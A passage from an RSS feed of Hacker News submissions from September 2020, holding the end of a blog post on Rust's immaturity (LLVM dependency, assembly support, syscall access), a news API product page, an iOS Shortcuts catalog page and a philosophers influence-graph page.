resources for rather theoretical problem but it may prove beneficial for compiler design itself.</p>
<p>Then there’s <strong>LLVM dependency.</strong> I understand that <code>LLVM</code> provides many advantages (like no need to worry about code generation for many platforms and optimising it) but it gives some disadvantages too. First, you don’t have a really self-hosting compiler (a theoretical problem but still a thing worth thinking about; also consider that you have to rely on a framework developed mostly by large corporations mostly in their own interests). Second, you’re limited by what it does e.g. I read complaints about debug builds being too slow mostly because of LLVM backend. And I suspect it still can’t do certain kinds of memory-related optimisations because it was designed with C++ compiler in mind which still has certain quirks regarding multiple memory access (plus IIRC there was one LLVM bug triggered by an infinite loop in Rust code that’s perfectly valid there but not according to C++ rules). I’m aware that <code>cranelift</code> exists (and Rust front-end for <code>GCC</code>) so hopefully this will be improved.</p>
<p>And finally there’s a thing related to the previous problem. Rust has poor <strong>support for assembly</strong>. Of course not so many people need standalone assembly and not inline one (which is still lacking but <code>asm!</code> is almost there) but languages oriented for systems programming support compiling assembly in addition to the higher-language code so it would be <em>proper</em> to support assembly files even with not so rich preprocessor syntax as GAS has. Fiddling with <code>build.rs</code> to invoke an external assembler is possible but not nice at all.</p>
<h3>Other Rust language problems</h3>
<p>There’s also one problem with Rust <code>std</code> library that I should mention too. It’s useless for interfacing OS. Now if I want to do something natural to any UNIX system I need to at least import <code>libc</code> crate <del datetime="2020-09-19T03:32:25+00:00">and link against an external libc</del> (it’s part of the runtime anyway). One solution would be that crate I heard of that wanted to translate <code>musl</code> into Rust so you can at least eliminate the linking step. But the proper solution would be to support at least OS-specific syscall() in <code>std</code> crate as many interesting libc functions are just a wrapper over it (like <code>open()</code>/<code>write()</code>/<code>ioctl()</code>; Windows is a different beast so I don’t mind if it’s <code>std::os::unix::syscall</code> and not something more common).</p>
<hr>
<p>I’m not a Rust language architect and I’m extremely unlikely to become one but I have an opinion on what Rust lacks in order to become a proper mature language really fit for systems development (three things essentially: being fully self-hosted, having a specification, and being able to interface low-level stuff without resorting to C compiler or assembler). Hopefully this will be rectified despite the lack of Mozilla.</p>

								
				<p>
					<small>
												This entry was posted on Friday, September 18th, 2020 at 2:03 pm and is filed under <a href="https://codecs.multimedia.cx/category/rust/" rel="category tag">Rust</a>, <a href="https://codecs.multimedia.cx/category/useless-rants/" rel="category tag">Useless Rants</a>.						You can follow any responses to this entry through the <a href="https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/feed/">RSS 2.0</a> feed. 

													You can <a href="#respond">leave a response</a>, or <a href="https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/trackback/" rel="trackback">trackback</a> from your own site.
						
					</small>
				</p>

			</div></div>]]>
            </description>
            <link>https://codecs.multimedia.cx/2020/09/why-rust-is-not-a-mature-programming-language/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526861</guid>
            <pubDate>Sat, 19 Sep 2020 12:05:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Currents API now include news from over 154 countries]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526640">thread link</a>) | @blackcat201
<br/>
September 19, 2020 | https://currentsapi.services/en/data | <a href="https://web.archive.org/web/*/https://currentsapi.services/en/data">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    

    <div>
        <p>We believe diverse news coverage should be prioritize over popularity and website traffic. Hence, we always ensure our news stream is diverse in terms of opinion, geo location and language.</p>
    </div>

    <section>
        <div>
        <p><span>Diverse Geolocation Distribution</span></p><p>Our swarm of spiders constantly monitor news happening over 154 countries, capturing any nation level events such elections, natural disaster, riots before receiving global converage. </p>
        </div>
        
    </section>

    <section>
        <div>

        <p><span>Fine Geolocation Coverage</span></p><p>
            News coverage in over 400 cities, including all states from United States, major cities in Australia, Canada, China, and Europe countries. 
            This means our news api also includes city level events such as community event, local corruption, petty crime that you won't found in major news agencies.
        </p>
        </div>
    </section>

    <section>
        <div>
            <p><span>Stock Exchange Announcements</span></p><p>
            Our news source also include company announcement from Singapore Stock Exchange, Japan Stock Group, London Stock Exchange and Taiwan Stock Exchange.
            </p>
            <p><a href="https://carbon.now.sh/?bg=rgba(255%2C255%2C255%2C1)&amp;t=seti&amp;wt=none&amp;l=auto&amp;ds=true&amp;dsyoff=9px&amp;dsblur=20px&amp;wc=true&amp;wa=false&amp;pv=56px&amp;ph=56px&amp;ln=false&amp;fl=1&amp;fm=Hack&amp;fs=13.5px&amp;lh=139%25&amp;si=false&amp;es=2x&amp;wm=false&amp;code=%250A%250Aimport%2520requests%250A%250Aurl%2520%253D%2520%2522https%253A%252F%252Fapi.currentsapi.services%252Fv1%252Flatest-news%253Fdomain%253Dsgx.com%252Cjpx.co.jp%252Clondonstockexchange.com%252Ctwse.com.tw%2522%250A%250Aheaders%2520%253D%2520%257B%250A%2520%2520%27Authorization%27%253A%2520%27API-KEY%27%250A%257D%250A%250Aresponse%2520%253D%2520requests.request(%2522GET%2522%252C%2520url%252C%2520headers%253Dheaders)%250A%250Aprint(response.json())%250A%250A" target="_blank">
                    <img src="https://currentsapi.services/images/sgx-example.png" alt="python requests example for loading Singapore Stock Exchange data">
                </a>                
            </p>
        </div>
    </section>


</section></div>]]>
            </description>
            <link>https://currentsapi.services/en/data</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526640</guid>
            <pubDate>Sat, 19 Sep 2020 11:17:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shortcuts Catalog (updated for iOS 14)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526635">thread link</a>) | @tosh
<br/>
September 19, 2020 | https://www.matthewcassinelli.com/sirishortcuts/ | <a href="https://web.archive.org/web/*/https://www.matthewcassinelli.com/sirishortcuts/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div data-elementor-type="wp-page" data-elementor-id="3397" data-post-id="3397" data-obj-id="3397" data-elementor-settings="[]"><div><div><section data-id="fe1d51b" data-element_type="section"><div><div><div data-id="6f7af17" data-element_type="column"><div><div><section data-id="f711d04" data-element_type="section"><div><div><div data-id="77b1ef2" data-element_type="column"><div><div><div data-id="25114dc" data-element_type="widget" data-widget_type="image.default"><div><p><img width="150" height="150" src="https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?resize=150%2C150&amp;ssl=1&amp;is-pending-load=1" alt="Shortcuts Catalog" data-attachment-id="7189" data-permalink="https://www.matthewcassinelli.com/shortcuts-catalog-icon/" data-orig-file="https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?fit=550%2C550&amp;ssl=1" data-orig-size="550,550" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Shortcuts Catalog icon" data-image-description="" data-medium-file="https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?fit=300%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?fit=550%2C550&amp;ssl=1" data-lazy-srcset="https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?w=550&amp;ssl=1 550w, https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?resize=150%2C150&amp;ssl=1 150w" data-lazy-sizes="(max-width: 150px) 100vw, 150px" data-lazy-src="https://i2.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Catalog-icon.png?resize=150%2C150&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" title="Shortcuts Catalog"></p></div></div></div></div></div><div data-id="9be9bce" data-element_type="column"><div><div><div data-id="5b9c656" data-element_type="widget" data-widget_type="heading.default"><p><h2>Welcome</h2></p></div></div></div></div></div></div></section><div data-id="71f8b10" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>Hello and welcome to the <b>Shortcuts Catalog</b>!</p><p>This is a public resource designed to help people get started with <b>Siri Shortcuts</b> and the <b>Shortcuts app</b>.</p><p>It’s made up of the <b>Shortcuts Library</b>, a collection of over 300 shortcuts grouped into folders, and the <b>Action Directory</b>, a documentation of 300 of the actions in the Shortcuts app used to build shortcuts.</p><p><span>Plus, if you sign up for a </span><a href="http://matthewcassinelli.com/membership">Membership</a><span>, you’ll get <b>new</b></span><b>&nbsp;shortcuts every week</b><span>,</span><b> </b><span>extra</span><b> ways to browse</b><span>, and</span><b> prerelease content </b><span>–</span><b>&nbsp;</b><a href="http://matthewcassinelli.com/membership">learn more</a><b>.</b></p><p><span>Enjoy!</span></p></div></div></div></div></div></div></div></div></section><section data-id="8bde51e" data-element_type="section"><div><div><div data-id="e9814f0" data-element_type="column"><div><div><section data-id="f5bfdd7" data-element_type="section"><div><div><div data-id="01f2811" data-element_type="column"><div><div><div data-id="6dc0831" data-element_type="widget" data-widget_type="image.default"><div><p><img width="150" height="150" src="https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?resize=150%2C150&amp;ssl=1&amp;is-pending-load=1" alt="Shortcuts Catalog" data-attachment-id="7196" data-permalink="https://www.matthewcassinelli.com/sirishortcuts/shortcuts-library-icon/" data-orig-file="https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?fit=550%2C550&amp;ssl=1" data-orig-size="550,550" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Shortcuts Library icon" data-image-description="" data-medium-file="https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?fit=300%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?fit=550%2C550&amp;ssl=1" data-lazy-srcset="https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?w=550&amp;ssl=1 550w, https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?resize=300%2C300&amp;ssl=1 300w, https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?resize=150%2C150&amp;ssl=1 150w" data-lazy-sizes="(max-width: 150px) 100vw, 150px" data-lazy-src="https://i1.wp.com/www.matthewcassinelli.com/wp-content/uploads/Shortcuts-Library-icon.png?resize=150%2C150&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" title="Shortcuts Catalog"></p></div></div></div></div></div><div data-id="b43d09b" data-element_type="column"><div><div><div data-id="1f66e42" data-element_type="widget" data-widget_type="heading.default"><p><h2>Shortcuts Library</h2></p></div></div></div></div></div></div></section><div data-id="dcea470" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3>My Folders</h3><ul><li><a href="https://www.matthewcassinelli.com/folders/schedule/"><span>Schedule</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/shazam/"><span>Shazam</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/listen-now/"><span>Listen Now</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/activism/"><span>Activism</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/launchpad/"><span>LaunchPad</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/smart-home/"><span>Smart Home</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/apple-music/"><span>Apple Music</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/emergencies/"><span>Emergencies</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/quick-moves/"><span>Quick Moves</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/speaker-control/"><span>Speaker Control</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/apple-tv/"><span>Apple TV</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/weather/"><span>Weather</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/notes/"><span>Notes</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/notes-folders/"><span>Notes folders</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/gifs/"><span>GIFs</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/shared-albums/"><span>Shared Albums</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/battery/"><span>Battery</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/sound-recognition/"><span>Sound Recognition</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/reminders/"><span>Reminders</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/voice/"><span>Voice</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/messaging/"><span>Messaging</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/copy-paste/"><span>Copy &amp; Paste</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/special-characters/"><span>Special Characters</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/wind-down/"><span>Wind Down</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/workouts/"><span>Workouts</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/health/"><span>Health</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/charging/"><span>Charging</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/internet/"><span>Internet</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/local/"><span>Local</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/transportation/"><span>Transportation</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/reading/"><span>Reading</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/news/"><span>News</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/location/"><span>Location</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/podcasts/"><span>Podcasts</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/photography/"><span>Photography</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/camera/"><span>Camera</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/measurements/"><span>Measurements</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/finances/"><span>Finances</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/stonks/"><span>Stonks</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/connection/"><span>Connection</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/ringers/"><span>Ringers</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/back-tap/"><span>Back Tap</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/entertainment/"><span>Entertainment</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/apple-event/"><span>Apple event</span></a></li><li><a href="https://www.matthewcassinelli.com/folders/tims-watch-routine/"><span>Tim’s Watch Routine</span></a></li></ul></nav></div></div></div></div></div></div></div></section><section data-id="1839cfd" data-element_type="section"><div><div><div data-id="edf1b20" data-element_type="column"><div><div><section data-id="d12ffba" data-element_type="section"><div><div><div data-id="3a63e57" data-element_type="column"><div><div><div data-id="eaa99dd" data-element_type="widget" data-widget_type="image.default"><div><p><img width="150" height="150" src="https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?resize=150%2C150&amp;ssl=1&amp;is-pending-load=1" alt="Shortcuts Catalog" data-attachment-id="7195" data-permalink="https://www.matthewcassinelli.com/sirishortcuts/action-directory-icon/" data-orig-file="https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?fit=550%2C550&amp;ssl=1" data-orig-size="550,550" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Action Directory Icon" data-image-description="" data-medium-file="https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?fit=300%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?fit=550%2C550&amp;ssl=1" data-lazy-srcset="https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?w=550&amp;ssl=1 550w, https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?resize=300%2C300&amp;ssl=1 300w, https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?resize=150%2C150&amp;ssl=1 150w" data-lazy-sizes="(max-width: 150px) 100vw, 150px" data-lazy-src="https://i0.wp.com/www.matthewcassinelli.com/wp-content/uploads/Action-Directory-Icon.png?resize=150%2C150&amp;ssl=1&amp;is-pending-load=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" title="Shortcuts Catalog"></p></div></div></div></div></div><div data-id="5376048" data-element_type="column"><div><div><div data-id="3564813" data-element_type="widget" data-widget_type="heading.default"><p><h2>Action Directory</h2></p></div></div></div></div></div></div></section><div data-id="f9fc864" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3>Groups</h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/"><span>Apps</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/"><span>Scripting</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/"><span>Media</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/location/"><span>Location</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/"><span>Document</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/sharing/"><span>Sharing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/web/"><span>Web</span></a></li></ul></nav></div></div><div data-id="9e9ac00" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/apps/">Apps</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/dates/"><span>Dates</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/apple-watch/"><span>Apple Watch</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/apple-tv-remote/"><span>Apple TV Remote</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/calendar/"><span>Calendar</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/clock/"><span>Clock</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/contacts/"><span>Contacts</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/health/"><span>Health</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/home/"><span>Home</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/facetime/"><span>FaceTime</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/mail-apps/"><span>Mail</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/reminders/"><span>Reminders</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/settings/"><span>Settings</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/wallet/"><span>Wallet</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/workout/"><span>Workout</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/news/"><span>News</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/stocks/"><span>Stocks</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/keynote/"><span>Keynote</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/pages/"><span>Pages</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/apps/numbers-app/"><span>Numbers app</span></a></li></ul></nav></div></div><div data-id="9f06fdd" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/media/">Media</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/media/app-store/"><span>App Store</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/audio/"><span>Audio</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/camera/"><span>Camera</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/gifs/"><span>GIFs</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/image-editing/"><span>Image Editing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/images/"><span>Images</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/itunes-store/"><span>iTunes Store</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/music/"><span>Music</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/photos/"><span>Photos</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/playback/"><span>Playback</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/playlists/"><span>Playlists</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/podcasts/"><span>Podcasts</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/up-next/"><span>Up Next</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/media/video/"><span>Video</span></a></li></ul></nav></div></div><div data-id="e86d54a" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/location/">Location</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/location/location-location/"><span>Location</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/location/addresses/"><span>Addresses</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/location/maps/"><span>Maps</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/location/routing/"><span>Routing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/location/weather/"><span>Weather</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/location/ride/"><span>Ride</span></a></li></ul></nav></div></div><div data-id="eda41e4" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/document/">Documents</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/document/archives/"><span>Archives</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/books/"><span>Books</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/editing/"><span>Editing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/file-storage/"><span>File storage</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/files-document/"><span>Files</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/notes/"><span>Notes</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/previewing/"><span>Previewing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/printing/"><span>Printing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/rich-text/"><span>Rich Text</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/text/"><span>Text</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/text-editing/"><span>Text Editing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/translation/"><span>Translation</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/document/qr-codes/"><span>QR Codes</span></a></li></ul></nav></div></div><div data-id="59a1fbd" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/sharing/">Sharing</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/sharing/clipboard/"><span>Clipboard</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/sharing/mail/"><span>Mail</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/sharing/messaging/"><span>Messaging</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/sharing/photos-sharing/"><span>Photos Sharing</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/sharing/system/"><span>System</span></a></li></ul></nav></div></div><div data-id="386b7b6" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/web/">Web</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/web/articles/"><span>Articles</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/web/safari/"><span>Safari</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/web/urls/"><span>URLs</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/web/web-requests/"><span>Web Requests</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/web/rss/"><span>RSS</span></a></li></ul></nav></div></div><div data-id="793f01b" data-element_type="widget" data-widget_type="taxonomy-terms-menu.default"><div><nav itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement"><h3><a href="https://www.matthewcassinelli.com/actions/groups/scripting/">Scripting</a></h3><ul><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/apps-scripting-2/"><span>Apps</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/control-flow/"><span>Control Flow</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/device/"><span>Device</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/dictionaries/"><span>Dictionaries</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/files/"><span>Files</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/items/"><span>Items</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/lists/"><span>Lists</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/math/"><span>Math</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/measurements/"><span>Measurements</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/network/"><span>Network</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/no-ops/"><span>No-ops</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/notification/"><span>Notification</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/numbers/"><span>Numbers</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/shell/"><span>Shell</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/shortcuts/"><span>Shortcuts</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/variables/"><span>Variables</span></a></li><li><a href="https://www.matthewcassinelli.com/actions/groups/scripting/x-callback/"><span>X-Callback</span></a></li></ul></nav></div></div></div></div></div></div></div></section></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.matthewcassinelli.com/sirishortcuts/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526635</guid>
            <pubDate>Sat, 19 Sep 2020 11:16:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Philosophers in an influence graph with PageRank scores]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24526402">thread link</a>) | @jonersRochen
<br/>
September 19, 2020 | https://s4n0i.github.io/schoolofathens/ | <a href="https://web.archive.org/web/*/https://s4n0i.github.io/schoolofathens/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Each node represents a philosopher. Nodes are linked if one philosopher was an influence to the other.
                The size of a node represents the overall influence of a philosopher on the network.</p><p>
                
                Click on a philosopher's node to get more info about them. You can also interact with the graph by dragging nodes, panning and zooming.
            </p></div></div>]]>
            </description>
            <link>https://s4n0i.github.io/schoolofathens/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24526402</guid>
            <pubDate>Sat, 19 Sep 2020 10:19:13 GMT</pubDate>
        </item>
        <item>
            <title>
